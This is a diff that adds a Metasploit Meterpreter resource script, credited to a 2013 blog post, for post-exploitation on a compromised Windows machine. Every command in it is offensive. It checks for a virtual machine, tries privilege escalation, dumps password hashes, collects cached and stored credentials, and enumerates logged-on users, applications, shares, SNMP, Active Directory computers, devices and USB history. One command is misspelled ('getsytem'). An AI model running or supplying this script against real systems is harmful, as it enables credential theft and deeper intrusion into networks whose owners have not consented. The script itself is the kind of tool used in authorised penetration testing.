@@ -1,0 +1,23 @@
+# From http://lockboxx.blogspot.co.uk/2013/06/scripting-metasploit-easy-resource.html
+run post/windows/gather/checkvm
+getuid
+sysinfo
+getsytem
+run post/windows/gather/hashdump
+run post/windows/gather/credentials/credential_collector
+run post/windows/gather/cachedump
+
+run post/windows/gather/enum_logged_on_users
+idletime
+
+run post/windows/gather/enum_applications
+run post/windows/gather/dumplinks
+
+ipconfig
+
+run post/windows/gather/enum_shares
+run post/windows/gather/enum_snmp
+run post/windows/gather/enum_ad_computers
+
+run post/windows/gather/enum_devices
+run post/windows/gather/usb_history
